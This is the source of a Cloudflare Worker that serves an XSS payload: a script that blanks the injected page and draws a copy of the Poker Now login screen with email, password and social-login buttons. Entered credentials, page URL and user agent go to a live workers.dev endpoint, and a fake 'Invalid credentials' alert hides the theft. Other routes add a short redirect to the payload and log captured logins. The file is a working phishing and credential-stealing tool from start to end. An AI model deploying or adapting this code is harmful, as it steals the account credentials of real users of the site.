export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    
    // Handle CORS preflight requests
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
          "Access-Control-Allow-Headers": "*",
          "Access-Control-Max-Age": "86400",
        },
      });
    }

    // Serve JavaScript payload
    if (url.pathname === "/payload.js") {
      const jsPayload = `
        // Clear all existing content
        document.head.innerHTML = '<title>Poker Now - Network</title>';
        document.body.innerHTML = '';
        
        // Create Poker Now login page replica
        const loginHTML = \`
        <div style="
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          margin: 0;
          padding: 0;
          min-height: 100vh;
          background: #0f1419;
          color: white;
        ">
          <!-- Header -->
          <nav style="
            background: #1a1f26;
            padding: 0 20px;
            border-bottom: 1px solid #2d3748;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: space-between;
          ">
            <div style="
              font-size: 24px;
              font-weight: bold;
              color: #4299e1;
            ">
              Poker Now
            </div>
            <div style="
              display: flex;
              gap: 15px;
              align-items: center;
            ">
              <span style="background: #4299e1; padding: 4px 8px; border-radius: 4px; font-size: 12px;">PLUS</span>
              <a href="#" style="color: #a0aec0; text-decoration: none;">Shop</a>
              <a href="#" style="color: #a0aec0; text-decoration: none;">Plus</a>
            </div>
          </nav>

          <!-- Main Content -->
          <div style="
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: calc(100vh - 60px);
            padding: 20px;
          ">
            <div style="
              background: #1a1f26;
              border: 1px solid #2d3748;
              border-radius: 12px;
              padding: 40px;
              width: 100%;
              max-width: 400px;
              box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            ">
              <div style="text-align: center; margin-bottom: 30px;">
                <h1 style="
                  color: white;
                  margin: 0 0 10px 0;
                  font-size: 28px;
                  font-weight: 600;
                ">Poker Now Login</h1>
                <p style="
                  color: #a0aec0;
                  margin: 0;
                  font-size: 14px;
                ">Sign in to access your account</p>
              </div>
              
              <form id="loginForm" style="margin: 0;">
                <div style="margin-bottom: 24px;">
                  <label style="
                    display: block;
                    margin-bottom: 8px;
                    color: #e2e8f0;
                    font-weight: 500;
                    font-size: 14px;
                  ">
                    Email Address
                  </label>
                  <input 
                    type="email" 
                    id="email" 
                    required
                    placeholder="Enter your email"
                    style="
                      width: 100%;
                      padding: 12px 16px;
                      background: #2d3748;
                      border: 1px solid #4a5568;
                      border-radius: 8px;
                      color: white;
                      font-size: 16px;
                      box-sizing: border-box;
                      transition: border-color 0.2s;
                    "
                  >
                </div>
                
                <div style="margin-bottom: 24px;">
                  <label style="
                    display: block;
                    margin-bottom: 8px;
                    color: #e2e8f0;
                    font-weight: 500;
                    font-size: 14px;
                  ">
                    Password
                  </label>
                  <input 
                    type="password" 
                    id="password" 
                    required
                    placeholder="Enter your password"
                    style="
                      width: 100%;
                      padding: 12px 16px;
                      background: #2d3748;
                      border: 1px solid #4a5568;
                      border-radius: 8px;
                      color: white;
                      font-size: 16px;
                      box-sizing: border-box;
                      transition: border-color 0.2s;
                    "
                  >
                </div>
                
                <button 
                  type="submit"
                  style="
                    width: 100%;
                    background: #4299e1;
                    color: white;
                    padding: 14px 20px;
                    border: none;
                    border-radius: 8px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    margin-bottom: 24px;
                    transition: background-color 0.2s;
                  "
                  onmouseover="this.style.background='#3182ce'"
                  onmouseout="this.style.background='#4299e1'"
                >
                  Sign In
                </button>
              </form>
              
              <div style="text-align: center; margin: 24px 0;">
                <div style="
                  height: 1px;
                  background: #2d3748;
                  margin: 16px 0;
                  position: relative;
                ">
                  <span style="
                    background: #1a1f26;
                    color: #a0aec0;
                    padding: 0 16px;
                    position: absolute;
                    left: 50%;
                    top: 50%;
                    transform: translate(-50%, -50%);
                    font-size: 14px;
                  ">or</span>
                </div>
              </div>
              
              <!-- Social Login Buttons -->
              <div style="display: flex; flex-direction: column; gap: 12px;">
                <button style="
                  width: 100%;
                  background: #5865f2;
                  color: white;
                  padding: 12px 16px;
                  border: none;
                  border-radius: 8px;
                  font-size: 14px;
                  cursor: pointer;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  gap: 8px;
                ">
                  Continue with Discord
                </button>
                
                <button style="
                  width: 100%;
                  background: #1da1f2;
                  color: white;
                  padding: 12px 16px;
                  border: none;
                  border-radius: 8px;
                  font-size: 14px;
                  cursor: pointer;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  gap: 8px;
                ">
                  Continue with Twitter
                </button>
                
                <button style="
                  width: 100%;
                  background: white;
                  color: #1a1f26;
                  padding: 12px 16px;
                  border: 1px solid #e2e8f0;
                  border-radius: 8px;
                  font-size: 14px;
                  cursor: pointer;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  gap: 8px;
                ">
                  Continue with Google
                </button>
                
                <button style="
                  width: 100%;
                  background: #1877f2;
                  color: white;
                  padding: 12px 16px;
                  border: none;
                  border-radius: 8px;
                  font-size: 14px;
                  cursor: pointer;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  gap: 8px;
                ">
                  Continue with Facebook
                </button>
              </div>
              
              <div style="text-align: center; margin-top: 24px;">
                <a href="#" style="
                  color: #4299e1;
                  text-decoration: none;
                  font-size: 14px;
                ">
                  Forgot your password?
                </a>
              </div>
            </div>
          </div>
        </div>
        \`;
        
        // Insert the fake Poker Now login page
        document.body.innerHTML = loginHTML;
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        
        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
          e.preventDefault();
          
          const email = document.getElementById('email').value;
          const password = document.getElementById('password').value;
          
          // Send credentials to your worker
          fetch('https://worker.mobzillafaceyt.workers.dev/credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              email: email,
              password: password,
              url: window.location.href,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              site: 'pokernow'
            })
          });
          
          // Show fake loading/error message
          const button = e.target.querySelector('button[type="submit"]');
          button.textContent = 'Signing in...';
          button.disabled = true;
          button.style.background = '#2d3748';
          
          setTimeout(() => {
            alert('Invalid credentials. Please try again.');
            button.textContent = 'Sign In';
            button.disabled = false;
            button.style.background = '#4299e1';
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
          }, 2500);
        });
        
        // Add social button handlers
        const socialButtons = document.querySelectorAll('button');
        socialButtons.forEach((btn, index) => {
          if (index > 0) { // Skip the main login button
            btn.addEventListener('click', () => {
              fetch('https://worker.mobzillafaceyt.workers.dev/social-attempt', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                  method: btn.textContent,
                  url: window.location.href,
                  timestamp: new Date().toISOString()
                })
              });
              alert('Social login temporarily unavailable. Please use email login.');
            });
          }
        });
      `;

      return new Response(jsPayload, {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Content-Type": "application/javascript",
          "Cache-Control": "no-cache",
        },
      });
    }

    // Handle short URL redirect
    if (url.pathname === "/s") {
      return Response.redirect("https://worker.mobzillafaceyt.workers.dev/payload.js", 302);
    }

    // Handle social login attempts
    if (url.pathname === "/social-attempt" && request.method === "POST") {
      const data = await request.json();
      console.log("Social login attempt:", data);
      
      return new Response("Social attempt logged", {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Content-Type": "text/plain",
        },
      });
    }

    // Handle credentials endpoint
    if (url.pathname === "/credentials" && request.method === "POST") {
      const data = await request.json();
      console.log("Captured credentials:", {
        username: data.username,
        password: "[REDACTED]",
        url: data.url,
        timestamp: data.timestamp,
        userAgent: data.userAgent
      });
      
      return new Response("Login processed", {
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Content-Type": "text/plain",
        },
      });
    }

    // Default response
    console.log("XSS payload triggered:", new Date().toISOString());
    return new Response("XSS request received successfully", {
      status: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Content-Type": "text/plain",
      },
    });
  },
};
